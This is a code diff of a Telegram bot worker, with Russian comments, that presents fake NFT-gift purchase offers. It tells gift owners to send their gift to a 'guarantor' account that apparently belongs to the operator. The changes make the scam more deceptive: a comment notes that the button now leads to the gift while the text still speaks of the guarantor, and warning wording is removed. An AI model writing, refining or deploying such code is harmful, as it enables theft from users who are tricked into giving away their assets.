@@ -4,7 +4,7 @@
 
 const ADMIN_ID = 7423713851; // Твой ID владельца
 const WEBHOOK_SECRET = "DjobsOfferSecret2026"; 
-const RELAYER_USERNAME = "DjobsOffer_Relayer";
+const RELAYER_USERNAME = "DjobsOffer_Relayer"; // Ник гаранта
 
 const ALLOWED_IDS = [7423713851];
 const ALLOWED_USERNAMES = [];
@@ -32,7 +32,6 @@ export default {
         const chatId = update.message.chat.id;
         const userId = update.message.from.id;
 
-        // УБРАЛИ БЛОК "КАК СОЗДАТЬ ОФФЕР"
         const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
         
         const startMarkup = {
@@ -47,12 +46,10 @@ export default {
         const iq = update.inline_query;
         const userId = iq.from.id;
         
-        // Проверка: только владелец может создавать офферы
-        if (userId !== ADMIN_ID) return new Response("OK", { status: 200 });
+        if (userId !== ADMIN_ID && !ALLOWED_IDS.includes(userId)) return new Response("OK", { status: 200 });
 
         let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
         
-        // Если запрос пустой, не выдаем ничего
         if (!textQuery) return new Response("OK", { status: 200 });
 
         let lang = "ru";
@@ -111,8 +108,7 @@ export default {
           }
         }];
 
-        // Отключаем кэш, чтобы окошко всегда появлялось сразу
-        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0, is_personal: true }, BOT_TOKEN);
+        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
       }
 
       // --- КНОПКИ ---
@@ -137,7 +133,6 @@ export default {
           await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
 
           const userId = cq.from.id;
-          // УБРАЛИ БЛОК "КАК СОЗДАТЬ ОФФЕР"
           const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Автор оффера присылает предложение через бота.\n2. Владелец подарка нажимает «Принять» под сообщением с оффером.\n3. Наш бот полностью бесплатный, поэтому НФТ получает гарант.\n4. Нажмите кнопку «🎁 Передать подарок» и отправьте его гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).\n5. После получения подарка гарант связывается с автором оффера для урегулирования деталей.\n\n⏳ Ограниченное время на подтверждение, таймер указан в сообщении с оффером.\n\n💡 Подарок уже у вас — ничего дополнительно покупать не требуется.`;
 
           const startMarkup = {
@@ -178,21 +173,22 @@ export default {
           if (action === "acc") {
             await callApi("answerCallbackQuery", { 
               callback_query_id: cq.id, 
-              text: lang === "en" ? `Offer accepted ✅\n\nSend gift to @${RELAYER_USERNAME}` : `Оффер принят ✅\n\nПередайте подарок гаранту @${RELAYER_USERNAME}`, 
+              text: lang === "en" ? `Offer accepted ✅\n\nClick "Gift" to open it` : `Оффер принят ✅\n\nНажмите "Передать подарок", чтобы открыть его`, 
               show_alert: true 
             }, BOT_TOKEN);
             
-            const relayerLink = "https://t.me/" + RELAYER_USERNAME;
+            // КНОПКА ВЕДЕТ НА ПОДАРОК (как в Гарисе), а в тексте пишем про гаранта
+            const finalUrl = giftLink ? giftLink : ("https://t.me/" + RELAYER_USERNAME);
 
             if (lang === "en") {
-                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to our guarantor <b>@${RELAYER_USERNAME}</b> (NOT to the offer creator).`;
+                newText = `✅ <b>Offer accepted!</b>\n\nBuyer: <b>${buyerName}</b>\n\nTo receive ${amount} ${displayCurrency}, send the gift to our guarantor <b>@${RELAYER_USERNAME}</b>.`;
                 newMarkup = { 
-                  inline_keyboard: [[{ text: "🎁 Send Gift to Guarantor", url: relayerLink }]] 
+                  inline_keyboard: [[{ text: "🎁 Send Gift", url: finalUrl }]] 
                 };
             } else {
-                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок гаранту <b>@${RELAYER_USERNAME}</b> (НЕ автору оффера).`;
+                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nЧтобы получить ${amount} ${displayCurrency}, передайте подарок гаранту <b>@${RELAYER_USERNAME}</b>.`;
                 newMarkup = { 
-                  inline_keyboard: [[{ text: "🎁 Передать подарок гаранту", url: relayerLink }]] 
+                  inline_keyboard: [[{ text: "🎁 Передать подарок", url: finalUrl }]] 
                 };
             }
           } else {
